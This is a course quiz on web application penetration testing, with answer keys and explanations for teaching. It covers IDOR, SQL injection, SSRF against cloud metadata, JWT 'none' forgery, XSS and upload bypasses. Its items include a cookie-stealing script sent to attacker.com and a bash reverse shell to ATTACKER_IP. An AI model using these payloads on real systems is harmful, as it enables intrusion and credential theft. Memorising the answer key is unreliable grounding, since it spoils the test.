# Quiz: Module 09 — Web Application Penetration Testing

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

**Instructions:** Select the single best answer for each question. Questions are aligned to CompTIA PenTest+ PT0-002 Domain 3: Attacks and Exploits.

---

### Question 1

A penetration tester wants to manually modify HTTP requests sent to a web application and resend each modified version multiple times without browser interference. Which Burp Suite component is most appropriate for this task?

- A) Proxy — to intercept all traffic in real time
- B) Intruder — to automate multiple request iterations
- C) Repeater — to manually resend a single request with modifications
- D) Decoder — to encode and decode request parameters

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** Repeater is designed specifically for the task described — capturing a single HTTP request, modifying specific parameters or headers, resending it, and comparing responses. It is the primary manual testing tool in Burp Suite for exploring parameter behavior, testing injection points, and verifying vulnerabilities.
- **Why A is incorrect:** Proxy intercepts all requests from the browser in real time. It is used to capture and review traffic, but requires browser interaction for each request. It is not designed for iterative manual resending of a single request.
- **Why B is incorrect:** Intruder automates the iteration — it cycles through a payload list automatically. The scenario asks for manual modification and manual resending, which is Repeater's purpose. Intruder would be appropriate if the tester wanted to systematically fuzz the parameter with many values automatically.
- **Why D is incorrect:** Decoder performs encoding and decoding operations (Base64, URL encoding, HTML entities, etc.) on data. It does not send requests to the target application.

---

### Question 2

A web application displays user profiles at the following URL:

```text
https://app.example.com/user/profile?uid=4821
```

A penetration tester logs in as a standard user, notes the `uid` value, changes it to `uid=4822` in Burp Repeater, and receives the profile data of a different user without any error or re-authentication prompt. Which OWASP Top 10 category does this finding fall under?

- A) A03:2021 — Injection
- B) A07:2021 — Identification and Authentication Failures
- C) A01:2021 — Broken Access Control
- D) A02:2021 — Cryptographic Failures

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** This is a classic IDOR (Insecure Direct Object Reference) finding — the application uses a user-controllable parameter (`uid`) to directly reference a database object without verifying that the requesting user is authorized to access that object. IDOR is the primary example under OWASP A01:2021 — Broken Access Control, which moved to the number one position in the 2021 list.
- **Why A is incorrect:** Injection (A03) involves placing code or commands into interpreter inputs — SQL, OS commands, LDAP queries. Changing a numeric ID to access another user's record is an authorization failure, not injection.
- **Why B is incorrect:** Authentication Failures (A07) relate to weaknesses in how users prove their identity — weak passwords, broken session management, insecure credential storage. This user was authenticated; the failure is in authorization (what they are allowed to do after authentication).
- **Why D is incorrect:** Cryptographic Failures (A02) relate to insufficient protection of data in transit or at rest — cleartext transmission, weak encryption algorithms, hardcoded keys. The UID parameter change is not a cryptographic issue.

---

### Question 3

During a web application test, a tester enters `1' OR '1'='1` in a login form's username field and leaves the password field blank. The application logs the tester in as the first user in the database — the administrator account. What vulnerability does this exploit, and what is its OWASP classification?

- A) Stored XSS — OWASP A03:2021; the payload is stored in the database and executes on the next request
- B) SQL Injection in an authentication form — OWASP A03:2021; the input manipulates the SQL query to bypass the password check
- C) SSRF — OWASP A10:2021; the payload causes the server to issue an internal request to the authentication database
- D) IDOR — OWASP A01:2021; the tester directly references the admin account's ID through the username field

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The payload `1' OR '1'='1` is a SQL injection authentication bypass. The input is interpreted by the backend SQL query, which becomes something like `SELECT * FROM users WHERE username = '1' OR '1'='1' AND password = ''`. The `OR '1'='1'` condition is always true, causing the query to return the first user record — often the admin. This is injection (A03) affecting an authentication endpoint.
- **Why A is incorrect:** Stored XSS stores JavaScript payloads in the database for later execution in other users' browsers. The payload `1' OR '1'='1` is SQL syntax, not JavaScript. No script tags, event handlers, or JS functions are present in the payload.
- **Why C is incorrect:** SSRF causes the server to make HTTP requests to internal systems. The login form attack does not cause any server-to-server request. It manipulates a database query, not a URL fetch operation.
- **Why D is incorrect:** IDOR involves directly referencing object identifiers (numeric IDs, GUIDs) to access unauthorized objects. The payload here is SQL injection syntax that manipulates query logic — not a direct object reference attack.

---

### Question 4

A penetration tester discovers that a web application displays product images by fetching them from a URL specified in a request parameter:

```text
GET /image?url=https://cdn.example.com/product123.jpg
```

The tester modifies the request to:

```text
GET /image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The server responds with IAM role credentials including `AccessKeyId`, `SecretAccessKey`, and `Token`. Which vulnerability class does this represent?

- A) XML External Entity (XXE) — the application processes external XML entities through the URL parameter
- B) Server-Side Request Forgery (SSRF) — the application fetches a URL on behalf of the attacker, reaching internal AWS metadata
- C) Reflected XSS — the URL parameter value is reflected in the response and executes as JavaScript
- D) Path Traversal — the attacker uses `../` notation in the URL to traverse to internal directories

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** SSRF occurs when a server-side function makes HTTP requests to an attacker-controlled destination. Here, the `url` parameter causes the application's server to fetch the AWS Instance Metadata Service (IMDS) endpoint `169.254.169.254` — a link-local address accessible only from within the EC2 instance. The attacker cannot reach this address directly; the vulnerable server fetches it on their behalf, returning IAM credentials.
- **Why A is incorrect:** XXE exploits XML parsers that process external entity references embedded in XML input. No XML parsing is involved in this scenario — the vulnerability is in an HTTP fetch function, not an XML parser.
- **Why C is incorrect:** XSS requires the payload to be reflected into an HTML context and executed as JavaScript in a browser. The response here is the raw metadata JSON, not HTML with embedded script execution.
- **Why D is incorrect:** Path traversal uses sequences like `../` to navigate the filesystem outside an intended directory. The payload here targets a network IP address, not a filesystem path. The mechanism is network request manipulation, not directory traversal.

---

### Question 5

A penetration tester is testing a web application and notices that the JWT token in the `Authorization` header has the following header portion when decoded:

```json
{"alg": "HS256", "typ": "JWT"}
```

The tester decodes the payload and sees:

```json
{"user_id": 42, "role": "user"}
```

The tester wants to test whether the application is vulnerable to the JWT "none" algorithm attack. What modification should be tested?

- A) Change `user_id` to `1` and re-sign the JWT with the HS256 algorithm using the key "secret"
- B) Change `alg` to `"none"`, change `role` to `"admin"`, re-encode the header and payload, and send the token with an empty signature
- C) Delete the entire JWT header and send only the payload portion
- D) Change `alg` to `"RS256"` and re-sign with an attacker-generated RSA private key

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The JWT "none" algorithm attack sets the algorithm to `"none"` in the header, modifies the payload (e.g., escalating role to admin), re-encodes both parts in Base64, and sends the token with an empty signature (or just the trailing dot). If the server accepts tokens with `alg: none` without signature verification, the attacker can forge arbitrary claims.
- **Why A is incorrect:** Re-signing with HS256 requires knowledge of the secret key. Without the correct key, the server will reject the signature. This is not the "none" algorithm attack — it would only work if the tester already knew the signing key.
- **Why C is incorrect:** Sending only the payload without a header is not a valid JWT structure. A JWT requires three parts: `header.payload.signature`. Removing the header entirely would cause the server to reject the token as malformed.
- **Why D is incorrect:** The RS256 confusion attack (algorithm confusion) involves a different technique where an HS256 server is tricked into using a public RSA key as an HMAC secret. This is a valid attack, but it is distinct from the "none" algorithm attack described in the question.

---

### Question 6

A tester is using Burp Suite Intruder to perform a credential brute force against a login form. The form has two fields: `username` and `password`. The tester has a list of 100 usernames and a list of 200 passwords. Which Intruder attack type tries every combination of username and password, resulting in 20,000 total requests?

- A) Sniper — iterates through all payloads in a single position
- B) Pitchfork — pairs username list item 1 with password list item 1, item 2 with item 2, etc.
- C) Cluster Bomb — tries all combinations of all payload lists (Cartesian product)
- D) Battering Ram — sends the same payload value in all positions simultaneously

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** Cluster Bomb performs a Cartesian product — it tries every value from list 1 paired with every value from list 2. With 100 usernames and 200 passwords, this produces 100 × 200 = 20,000 requests. This is the correct choice for full credential brute force when no known username-password pairing exists.
- **Why A is incorrect:** Sniper uses a single payload list against a single marked position at a time. With two positions (username and password), it would test each payload value in position 1 first, then each in position 2 — but not as combinations. Total requests = 100 + 200 = 300.
- **Why B is incorrect:** Pitchfork runs multiple payload lists in parallel — list item 1 goes to position 1 AND position 2 simultaneously. It pairs items by index, stopping when the shorter list is exhausted. With 100 and 200 items, it would produce 100 requests (limited by the shorter list). This is used for known username-password pairs from credential leaks.
- **Why D is incorrect:** Battering Ram sends the same single payload to all marked positions simultaneously. It uses one payload list and puts each value in every position at the same time. It cannot test different values in different positions, making it unsuitable for username-password brute forcing.

---

### Question 7

A penetration tester identifies that a web application reflects user input in the response without encoding. The tester submits the following payload in a comment field:

```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

Other users who view the comment page have their session cookies sent to the attacker's server. Which XSS type is this, and why is it more dangerous than reflected XSS?

- A) DOM-based XSS; it is more dangerous because it modifies the browser DOM without server involvement
- B) Stored XSS; it is more dangerous because the payload persists in the database and executes for every user who views the affected page without requiring them to click a crafted link
- C) Reflected XSS; it is more dangerous because the payload travels through the server response on each request
- D) Blind XSS; it is more dangerous because the attacker cannot see the execution in their own browser

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Stored XSS (also called persistent XSS) stores the payload in the application's database and serves it to every user who loads the page containing the malicious comment. No social engineering or crafted link is required — any authenticated user who visits the comment page becomes a victim. This makes it significantly more impactful than reflected XSS, which requires each victim to click a specially crafted link.
- **Why A is incorrect:** DOM-based XSS occurs when JavaScript in the page reads attacker-controlled data from the DOM (URL fragment, document.referrer, etc.) and writes it to an executable sink without server-side involvement. The scenario describes a server-stored payload, not DOM manipulation.
- **Why C is incorrect:** Reflected XSS is the type where the payload is included in the server's immediate response to a request containing the payload — typically via a URL. It requires the victim to click the crafted URL. The scenario describes stored XSS, not reflected.
- **Why D is incorrect:** Blind XSS is a variant of stored XSS where the payload executes in an internal context the attacker cannot directly observe (admin panel, log viewer). While this scenario does describe stored XSS, the more precise and complete answer is Option B, which correctly identifies stored XSS and explains the persistence-based reason for greater danger.

---

### Question 8

A penetration tester is performing a union-based SQL injection against a web application and discovers the query uses 3 columns. They want to extract the database version. The first and third columns are used for display; the second column position is injectable. Which payload correctly extracts the database version string?

- A) `1 UNION SELECT version(), null, null--`
- B) `1 UNION SELECT null, @@version, null--`
- C) `1 UNION SELECT null, null, version()--`
- D) `1 UNION SELECT null, null, null WHERE version()--`

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The tester established that the second column position is injectable and displayed. `UNION SELECT null, @@version, null--` places the version string (`@@version` in MySQL/MSSQL) in the second column position, where it will appear in the application's output. `null` fills the other two column positions to maintain the required 3-column count.
- **Why A is incorrect:** This places `version()` in the first column position, not the second. Since the tester determined the second column is the injectable/displayed position, results in the first column may not be visible in the output.
- **Why C is incorrect:** This places `version()` in the third column position, not the second. The same reasoning applies — the third column may not be displayed.
- **Why D is incorrect:** `WHERE version()` is syntactically incorrect SQL. `WHERE` requires a conditional expression that evaluates to true/false, not a function call used as a filter condition. This query would produce a SQL error.

---

### Question 9

Which of the following is the correct description of the difference between a reflected XSS attack and a stored XSS attack in terms of delivery mechanism?

- A) Reflected XSS is delivered through a database injection; stored XSS is delivered through HTTP headers
- B) Reflected XSS requires the victim to request a URL containing the payload, which is echoed back in the response; stored XSS persists in the application and executes when any user loads the affected page
- C) Reflected XSS executes only in the attacker's browser; stored XSS executes only in the administrator's browser
- D) Reflected XSS requires JavaScript to be enabled in the victim's browser; stored XSS executes regardless of JavaScript settings

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** This is the precise technical distinction. Reflected XSS: the payload is part of the HTTP request (usually in a URL parameter) and is echoed back in the immediate response — the victim must be induced to make that specific request, typically by clicking a crafted link. Stored XSS: the payload is written to the server's data store (database, log file, user comment) and served to all subsequent users who load the affected content.
- **Why A is incorrect:** Reflected XSS is delivered through URL parameters or form inputs — not database injection. Stored XSS does involve database storage, but the delivery to victims is through normal page loading, not HTTP headers.
- **Why C is incorrect:** Reflected XSS executes in the victim's browser when they click the crafted link — not the attacker's browser. Stored XSS executes in any user's browser who loads the affected page, which may include admins but is not limited to them.
- **Why D is incorrect:** Both reflected and stored XSS require JavaScript to be enabled to execute `<script>` payloads. However, event-handler-based XSS (like `onerror=`) may execute without script blocks. The JavaScript requirement is the same for both types and is not the distinguishing factor.

---

### Question 10

A web application has an API endpoint at `/api/v1/user/settings` that returns and updates user settings. A penetration tester discovers that sending the following JSON body to the endpoint creates an unexpected account with admin privileges:

```json
{"name": "Test User", "email": "test@example.com", "role": "admin", "active": true}
```

The tester's original account is a standard user without admin rights. The API accepted the `role` field and assigned it. Which vulnerability does this represent?

- A) SQL Injection — the `role` field contains a SQL payload that modifies the database directly
- B) Mass Assignment — the API applies all submitted JSON properties including `role`, which should not be user-controllable
- C) Broken Authentication — the API does not properly verify the user's identity before processing the request
- D) SSRF — the `role` field causes the server to make a request to an internal authorization service

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Mass Assignment (also called Auto-Binding) occurs when an API or framework automatically maps all properties from user-supplied input directly onto an object model or database record — including properties that should be read-only or system-controlled. A user should never be able to set their own `role` — this field should be ignored or rejected when it comes from user input. Mass Assignment is classified under OWASP API Security Top 10 as API6:2019 and relates to A04:2021 (Insecure Design) in the web Top 10.
- **Why A is incorrect:** The `role` field contains a plain string value `"admin"` — not SQL syntax. No SQL injection indicators are present. The attack works because the API applies the property, not because a query was manipulated.
- **Why C is incorrect:** Broken Authentication relates to how the user proves their identity. The tester is authenticated as a valid user — the issue is what the authenticated user is permitted to do (authorization), not whether authentication works.
- **Why D is incorrect:** SSRF causes the server to make outbound HTTP requests to attacker-controlled destinations. Submitting a JSON role value does not trigger any server-to-server HTTP request. The vulnerability is in object property binding, not URL fetching.

---

---

### Question 11

A tester intercepts an HTTP request in Burp Suite and observes the cookie: `session=eyJ1c2VyX2lkIjogMSwgInJvbGUiOiAidXNlciJ9`. They base64-decode it and receive `{"user_id": 1, "role": "user"}`. What vulnerability exists and what is the exploitation approach?

- A) SQL injection — the base64-encoded cookie contains a SQL payload that can be modified to extract database contents
- B) Insecure direct object reference — changing `user_id` to another value would access another user's data
- C) Insecure client-side session management — the session token contains server-controlled claims that are not signed; the attacker can modify `"role": "user"` to `"role": "admin"`, re-encode the value, and submit the modified cookie to escalate privileges
- D) Broken authentication — the base64 encoding is a weak hashing algorithm that can be cracked offline

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** Storing security-sensitive attributes like `role` in a client-controlled, unsigned cookie is a critical vulnerability. Base64 is encoding, not encryption or signing — anyone can decode and re-encode values. Without a cryptographic signature (like a JWT HMAC or AEAD encryption), the server cannot detect tampering. The exploitation path is: decode → modify `role` to `admin` → re-encode → submit. This is classified under OWASP A07 (Identification and Authentication Failures) and A02 (Cryptographic Failures).
- **Why A is incorrect:** No SQL syntax is present. The cookie contains JSON data representing session state, not a SQL query. SQL injection attacks target database query parsing, not cookie value modification.
- **Why B is incorrect:** IDOR involves accessing other users' resources by changing an identifier. This vulnerability specifically targets privilege escalation via role modification, not accessing another user's data through an ID.
- **Why D is incorrect:** Base64 is not a hashing algorithm — it is a reversible encoding scheme. Hashing algorithms (MD5, SHA-1) are one-way functions. Base64 cannot be "cracked" because it is trivially reversible by design.

---

### Question 12

A tester discovers that a web application includes the `X-Forwarded-For` header value in SQL queries without sanitization. The application uses MySQL. Which payload tests for SQL injection through this header?

- A) `' OR 1=1--` submitted in the username field
- B) Setting `X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--` to test for blind time-based injection through the header
- C) `<script>alert(1)</script>` in the `X-Forwarded-For` header to test for reflected XSS
- D) `../../../etc/passwd` in the `X-Forwarded-For` header to test for path traversal

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** If the application inserts the `X-Forwarded-For` value into a SQL query, injecting a `SLEEP(5)` payload tests for blind time-based SQL injection: if the response takes approximately 5 seconds longer than baseline, the query is executing the injected SQL. The single quote closes the string context and `AND SLEEP(5)--` appends the time-delay test. This is a non-destructive confirmation technique.
- **Why A is incorrect:** The username field is the correct location for standard login form injection. The question establishes that the `X-Forwarded-For` header is the affected input. Testing the wrong input would not reveal the header injection vulnerability.
- **Why C is incorrect:** `<script>alert(1)</script>` tests for reflected XSS, not SQL injection. The question asks for a SQL injection test.
- **Why D is incorrect:** `../../../etc/passwd` tests for path traversal / directory traversal vulnerabilities, not SQL injection. Path traversal exploits file system access, not database query parsing.

---

### Question 13

Burp Suite's Intruder tool is configured with a wordlist attack against a login form's username field. After running the attack, the tester observes that one response has a status code of 302 (redirect) while all others return 200. What does this indicate?

- A) The 302 response indicates a rate-limit was triggered and that username is blocked
- B) The 302 response indicates a successful login — the application redirected to the authenticated dashboard after accepting valid credentials; the 200 responses indicate failed login attempts that reload the login page
- C) The 302 response indicates the server rejected the payload as suspicious and sent an error redirect
- D) The 302 response means the application detected Burp Suite and is redirecting the scan to a honeypot

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Web applications typically redirect (HTTP 302) to a dashboard or main page upon successful authentication. Failed login attempts usually return HTTP 200 with the login page reloaded and an error message. A single 302 among hundreds of 200 responses is a strong indicator that the corresponding username/password combination is valid. This is a core Burp Intruder credential-stuffing analysis technique.
- **Why A is incorrect:** Rate limiting typically produces HTTP 429 (Too Many Requests) responses, not 302 redirects. A 302 redirect to an error page is possible but much less common than redirect-to-dashboard on success.
- **Why C is incorrect:** Legitimate applications do not redirect to error pages with a 302 when they detect suspicious payloads. Firewall or WAF blocks typically produce 403 responses.
- **Why D is incorrect:** Web applications do not detect or specifically respond to Burp Suite as a tool. The response behavior is based on the content of the HTTP request, not the tool used to send it.

---

### Question 14

A web application reflects user input in an error message without encoding it. A tester submits `"><img src=x onerror=alert(1)>` in a search field and an alert box appears. Why does this payload bypass a filter that blocks `<script>` tags?

- A) The `img` tag exploits a separate vulnerability class (CSRF) and the alert is a side effect
- B) The payload uses an HTML event handler (`onerror`) on a non-script tag; many XSS filters only block `<script>` tags and miss injection through event handlers on other HTML elements
- C) The `">` prefix executes JavaScript directly without requiring a tag and the `img` tag is decoy content
- D) The `onerror` event fires on the server side before the filter processes the response

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Many naive XSS filters block `<script>` tags specifically but do not sanitize HTML attributes. The `onerror` event handler fires when the `img` tag fails to load (the `src=x` references a non-existent image). The event handler attribute contains the JavaScript payload. This is a common WAF/filter bypass technique — there are dozens of HTML event handlers (`onload`, `onmouseover`, `onclick`, etc.) that can carry XSS payloads without requiring a `<script>` block.
- **Why A is incorrect:** This is an XSS vulnerability, not CSRF. CSRF exploits cross-site request forgery — making a victim's browser submit authenticated requests to another site. The alert executing in the browser is JavaScript execution from XSS.
- **Why C is incorrect:** `">` does not execute JavaScript. It closes an existing HTML attribute and tag context to allow injecting new HTML. The JavaScript executes from the `onerror` event handler, not from the `">` prefix.
- **Why D is incorrect:** JavaScript event handlers execute in the victim's browser (client-side), not on the server. Filtering occurs server-side before the response is sent, but the event handler fires in the browser after the page loads.

---

### Question 15

A tester discovers an internal web application that fetches URLs provided by users. By submitting `http://169.254.169.254/latest/meta-data/`, the application returns AWS instance metadata including IAM role credentials. Which vulnerability class is this, and what is the primary risk?

- A) SQL injection — the URL parameter is being passed to a database query
- B) Server-Side Request Forgery (SSRF) — the server is making HTTP requests to user-controlled URLs, enabling access to internal services and cloud metadata; the IAM role credentials can be used to escalate privileges across the entire AWS account
- C) IDOR — the `169.254.169.254` IP address is another user's internal resource identifier
- D) Remote File Inclusion (RFI) — the application is including and executing a remote file from the metadata server

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** SSRF occurs when an application fetches resources from a URL supplied (or influenced) by the attacker and the server makes the request from its privileged internal network position. The AWS instance metadata service at `169.254.169.254` is link-local and only accessible from the EC2 instance itself — the SSRF forces the server to access it on the attacker's behalf. IAM role credentials obtained from the metadata service can be used to call AWS APIs with the instance's permissions, potentially compromising the entire cloud environment.
- **Why A is incorrect:** The URL parameter controls an HTTP fetch, not a SQL query. No database query parsing is involved.
- **Why C is incorrect:** IDOR involves accessing another user's data by modifying an object identifier within the application's data model. The metadata service at `169.254.169.254` is an AWS infrastructure service, not another user's resource within the application.
- **Why D is incorrect:** Remote File Inclusion executes code from a remote file included by the web application's include mechanism (PHP `include()`, for example). SSRF fetches a URL as an HTTP resource — it does not execute the fetched content as code.

---

### Question 16

Which OWASP Top 10 (2021) category describes a vulnerability where a user can access another user's bank account records by changing the account ID parameter from `?account_id=1001` to `?account_id=1002`?

- A) A03:2021 — Injection
- B) A07:2021 — Identification and Authentication Failures
- C) A01:2021 — Broken Access Control (specifically Insecure Direct Object Reference)
- D) A05:2021 — Security Misconfiguration

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** IDOR (Insecure Direct Object Reference) is a subcategory of Broken Access Control (A01:2021). It occurs when an application exposes direct references to internal implementation objects (database record IDs, filenames) and fails to verify that the requesting user is authorized to access the referenced object. Changing `account_id=1001` to `1002` and accessing another user's records is the textbook IDOR example.
- **Why A is incorrect:** Injection (A03) involves unvalidated input being interpreted as code or commands by an interpreter. Changing a numeric parameter to access another record is an access control failure, not injection.
- **Why B is incorrect:** Authentication Failures (A07) relates to how the application verifies user identity. The user is authenticated correctly — the issue is that the authorization check to verify they can only access their own account is missing.
- **Why D is incorrect:** Security Misconfiguration (A05) covers default credentials, open cloud storage, verbose error messages, and unpatched software — not access control logic failures in application code.

---

### Question 17

A tester uses Burp Repeater to manually test a login form with authentication bypass payloads. After submitting `admin' --` as the username with any password, the application logs in as the admin user. Explain why `--` is used in this payload.

- A) `--` is a JavaScript comment that prevents the password from being checked client-side
- B) `--` is an SQL comment sequence (in MySQL and MSSQL); it causes the database to ignore everything after it in the query, including the password check portion of the SQL statement
- C) `--` is a URL encoding sequence that the server decodes as a null byte, terminating the string
- D) `--` increments the admin user's login counter to satisfy a minimum-login-count authorization check

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** In SQL, `--` (double-dash) begins a single-line comment. When the payload `admin' --` is inserted into a query like `SELECT * FROM users WHERE username='$input' AND password='$pass'`, the apostrophe closes the string and `--` comments out the rest: `WHERE username='admin' --' AND password='...'`. The password check is entirely removed from the executed query, and any account named `admin` is returned regardless of password.
- **Why A is incorrect:** `--` has no special meaning in JavaScript as a comment delimiter. JavaScript uses `//` for single-line comments and `/* */` for multi-line. SQL injection operates on the server-side SQL engine, not client-side JavaScript.
- **Why C is incorrect:** `--` is not URL encoding. URL encoding uses `%XX` hex notation. `--` in SQL context is a comment sequence evaluated by the database engine.
- **Why D is incorrect:** SQL comment syntax has nothing to do with login counters or authorization counters. The `--` is purely a query syntax element that removes subsequent SQL conditions from execution.

---

### Question 18

A web application stores sensitive data in a JWT (JSON Web Token). A tester inspects the token and changes the `alg` header from `HS256` to `none`. The server accepts the modified token without a signature. What vulnerability does this represent?

- A) Insecure deserialization — the token's base64 payload is being deserialized without validation
- B) JWT "none" algorithm attack — a misconfigured server accepts unsigned tokens when the algorithm is set to `none`, allowing any user to forge arbitrary claims including elevated roles
- C) SSRF — the `alg: none` causes the server to make a request to an external validation endpoint with no response check
- D) Broken authentication — the server failed to require multi-factor authentication before accepting the JWT

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The JWT specification includes `none` as a valid algorithm value meaning the token is unsigned. Some early JWT library implementations accepted `alg: none` as valid and skipped signature verification entirely. An attacker can modify the payload (including changing `role` or `user_id` claims), set `alg: none`, remove the signature, and submit a token that some servers accept as valid. This is a well-documented JWT attack that OWASP documents under A07 (Authentication Failures).
- **Why A is incorrect:** Insecure deserialization involves converting serialized objects into application objects in an unsafe way, often enabling remote code execution. JWT verification is not a deserialization vulnerability — it is a signature validation failure.
- **Why C is incorrect:** The `alg` field controls the cryptographic algorithm for signature verification. It does not control any server-to-server HTTP requests.
- **Why D is incorrect:** Multi-factor authentication is unrelated to JWT algorithm validation. The server's failure to require MFA is a separate authentication concern from the none-algorithm JWT bypass.

---

### Question 19

A tester discovers a web application that uses the `cmd` parameter to execute system commands: `https://target.com/admin/util?cmd=ping+127.0.0.1`. They test for command injection by submitting `?cmd=ping+127.0.0.1;id`. The response includes `uid=33(www-data) gid=33(www-data)`. What is the exploitation path for obtaining a reverse shell?

- A) The application requires root access to execute shell commands; `www-data` is a non-exploitable context
- B) Submit a URL-encoded reverse shell payload through the `cmd` parameter, such as `?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'`, which executes in the context of the web server user and calls back to a netcat listener
- C) Use sqlmap against the `cmd` parameter to extract the database and obtain admin credentials before attempting shell access
- D) The `;id` injection only works on Linux; Windows systems require `&whoami` and do not allow reverse shells

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** The `; id` test confirmed arbitrary command injection — the server executes commands appended after the semicolon. A bash reverse shell payload in the same `cmd` parameter will execute as `www-data` and call back to the attacker's netcat listener (`nc -lvnp 4444`). While `www-data` is unprivileged, a reverse shell provides interactive access from which privilege escalation can proceed.
- **Why A is incorrect:** `www-data` is a limited web server account, but command injection still provides interactive shell access. From that shell, privilege escalation techniques (SUID, sudo, kernel exploits) can elevate to root. The context is not non-exploitable.
- **Why C is incorrect:** The vulnerability is OS command injection, not SQL injection. `sqlmap` tests SQL query parameters. Using sqlmap against a command-injection parameter would not work and would not extract the OS shell access already confirmed.
- **Why D is incorrect:** While the reverse shell syntax differs between Linux and Windows, the scenario already confirmed Linux execution (`www-data` is a Linux account). The statement that Linux reverse shells are not possible is false.

---

### Question 20

During web application testing, a tester discovers a file upload function that accepts image files. They upload a PHP webshell renamed `shell.php.jpg`. The server stores the file at `/uploads/shell.php.jpg` and the tester can access it via the browser. The PHP code does not execute. What additional test should the tester perform to determine if the vulnerability is exploitable?

- A) Rename the file to `shell.jpg.php` and re-upload — some servers execute files based on the last extension
- B) The vulnerability cannot be exploited since JPEG files cannot contain PHP; move on to the next test case
- C) Test the upload with just `shell.php` (no double extension); if the server only blocks based on filename extension checking but not MIME type validation, the server may store and execute the PHP file directly
- D) Both A and C represent valid bypass techniques that should be tested; file upload filter bypasses require systematic extension, MIME type, and content validation testing before concluding the vulnerability is or is not exploitable

**Correct Answer:** D

**Distractor Analysis:**

- **Why D is correct:** File upload security depends on multiple validation layers: extension checking (blacklist vs. whitelist), MIME type validation, content inspection, and server execution configuration. A professional approach tests multiple bypass vectors: double extensions (`.php.jpg`, `.jpg.php`), null bytes in filenames (older servers), MIME type manipulation (setting `Content-Type: image/jpeg` while uploading PHP), and direct `.php` upload. No single test concludes the finding — systematic testing is required.
- **Why A is incorrect:** While `.jpg.php` is a valid bypass test (Apache may execute the PHP extension), focusing only on this one technique is incomplete. A thorough assessment requires testing all listed bypass vectors.
- **Why B is incorrect:** Files can absolutely contain PHP code regardless of extension. The extension and MIME type tell the server how to handle the file — they do not determine what the file contains. An attacker always controls what they upload.
- **Why C is incorrect:** Testing bare `.php` upload is one valid technique, but it is not the only test. Option D correctly identifies that multiple techniques must be systematically tested.

---

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
